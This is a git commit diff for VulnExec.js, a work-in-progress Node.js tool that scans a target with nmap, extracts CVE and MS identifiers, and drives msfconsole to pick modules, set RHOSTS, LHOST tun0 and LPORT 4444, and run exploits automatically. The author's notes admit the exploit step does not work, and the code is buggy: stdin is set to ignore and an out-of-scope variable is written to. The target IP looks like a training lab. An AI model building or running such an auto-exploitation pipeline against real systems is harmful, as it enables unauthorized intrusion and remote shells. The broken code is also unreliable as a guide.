ab6f24ddbbce1077080c57c1a2a8bce61d64119b
Jake <59755030+jake0001-dev@users.noreply.github.com>
2023-03-15 07:24:29 +0000

    Last push of the evening
    Added line by line reading of msf console to try and allow for more control.
    
    Added notes of what currently works, how it works and possible solutions to continue tomorrow.

--- VulnExec.js/index.js
+++ VulnExec.js/index.js
@@ -1,3 +1,48 @@
+/*
+NOTES : 
+    - This is a work in progress
+    ERROR : Line 121: Cannot Read Properties of null (reading 'write)
+
+    NMAP SCAN = Working
+    GET GET VULN = Working
+    EXPLOIT = Not Working
+
+    Possible Solution:
+    - Read line by line and check if the line contains the string 'CVE-' or 'ms'
+      - Get the CVE or MS number + the exploit name
+        - Use the exploit name to get the exploit path
+            - Use the exploit path to run the exploit
+
+    - Possible Solution 2:
+        - Use the exploit name to get the exploit path
+            - Use the exploit path to run the exploit
+
+    - Possible Solution 3:
+        - Work out the system OS
+            - Filter based on OS
+                - List all exploits to a file
+                    - Read the file and get the exploit path
+                        - Use the exploit path to run the exploit
+
+    
+    NOTE :
+    
+    Readline should print the msf console line by line and not work using the buffer.
+    This will allow filtering line by line and not having to manipulate a large buffer.
+    This will also allow the user to see the msf console in real time.
+
+    TO DO : 
+        - User input for IP
+        - User input for local network adaptor
+
+        - Filter the exploits based on the OS
+
+        
+ 
+
+*/
+
+
 const { exec, spawn} = require('child_process');
 const chalk = require('chalk');
 const axios = require('axios');
@@ -5,13 +50,14 @@ const Spinnies = require('spinnies');
 const spinner = new Spinnies();
 const data_spinner = new Spinnies();
 const fs = require('fs');
+const {chunksToLinesAsync, chomp} = require('@rauschma/stringio');
 
 const log = require('./modules/utils.js');
 const { colorOptions } = require('spinnies/utils.js');
 
 // global variables
 const cves = [];
-const ms = [];
+const mses = [];
 var ip = '10.129.250.42'
 
 const logo = `
@@ -72,55 +118,71 @@ nmap_scan = async (ip) => {
 
 const get_vuln = async () => {
     const data = fs.readFileSync('nmap.txt', 'utf8');
-    const cve = data.match(/CVE-\d{4}-\d{4,7}/g);
-    const ms = data.match(/MS\d{2}-\d{3}/g);
+    const cve = data.match(/CVE-\d{4}-\d{4,7}/g) // CVE-2017-0143
+    const ms = data.match(/ms\d{2}-\d{3}/g) // ms12-345
 
-    if(cve && ms) {
-        log.vuln('CVEs Found: ' + cve);
-        log.vuln('MS Found: ' + ms);
-        cves.push(cve);
 
+    let combo = []
+
+    cve.toString().split(',').forEach((item) => {
+        cves.push(item); // Itterates through the string and puts to array
+    });
+
+    ms.toString().split(',').forEach((item) => {
+        mses.push(item); // Itterates through the string and puts to array
+    });
+
+    for (let i = 0; i < cves.length; i++) {
+        
+        combo.push(cves[i]); // PUSHES CVE TO COMBO
     }
-    if(ms) {
-        log.vuln('MS Found: ' + ms);
-        ms.push(ms);
+
+    for (let i = 0; i < mses.length; i++) {
+        combo.push(mses[i]); // PUSHES MS TO COMBO
     }
 
-    if(cves.length > 0 || ms.length > 0) {
+    if(combo.length > 0) {
         spinner.succeed('get_data', {text: 'Vulnerabilities Found', color: 'red'});
+        log.vuln(`Found ${cves.length} CVEs and ${mses.length} MSs`)
+        log.vuln(`Found ${combo.length} Total Vulnerabilities`)
+        log.vuln(`[${combo}]`)
 
-        if (cves.length > 0) {
-            spinner.add('cve', {text: 'Exploiting CVEs', color: 'red'});
-            exploit(ip);
-        }
+        exploit(combo, ip) // msf exploit
         
     } else {
-        spinner.fail('data', {text: 'No Vulnerabilities Found', color: 'red'});
-        log.info('No Vulnerabilities Found');
+        spinner.fail('get_data', {text: 'No Vulnerabilities Found', color: 'red'});
+        log.info('No Vulnerabilities Found'); 
     }
 
 }
 
 //msf exploit 
-const exploit = async (ip) => {
-    for (let i = 0; i < cves.length; i++) {
-        const exploit = spawn('msfconsole', ['-q']);
-        exploit.stdin.write(`search ${cves[0]}\n`);
-        exploit.stdout.on('data', (data) => {
-            if (data.includes('No results')) {
-                spinner.fail('cve', {text: 'No Exploit Found', color: 'red'});
-                exploit.kill();
-            } else {
-                log.info(data);
-            }
-        })
-        exploit.stderr.on('data', (data) => {
-            data = data.toString();
-            if (data.includes('stty')) {
-                return
-            } else {
-                log.error(data);
-            }
-        })
+const exploit = async (combo, ip) => {
+    var options = { stdio: ["ignore", "pipe", process.stderr] };
+    spinner.add('exploit', {text: 'Exploiting', color: 'red'});
+    
+    for (let i = 0; i < combo.length; i++) {
+        const msf = spawn('msfconsole', ['-q'], options);
+        msf.stdin.write(`search ${combo[i]}`) // HERE IS WHERE THE ERROR OCCURS
+        await echoReadable(msf.stdout);
     }
+        
 }
+
+
+async function echoReadable(readable) {
+    for await (const line of chunksToLinesAsync(readable)) { // (C)
+      console.log('LINE: '+chomp(line))
+
+      if (line.includes('exploit/')) {
+        number = line.match(/\d+/g).map(Number);
+        console.log(number)
+        msf.stdin.write(`use ${number}`)
+        msf.stdin.write(`set RHOSTS ${ip}`)
+        msf.stdin.write('set LHOST tun0')
+        msf.stdin.write('set LPORT 4444')
+        msf.stdin.write('run -j')
+
+      }
+    }
+  }
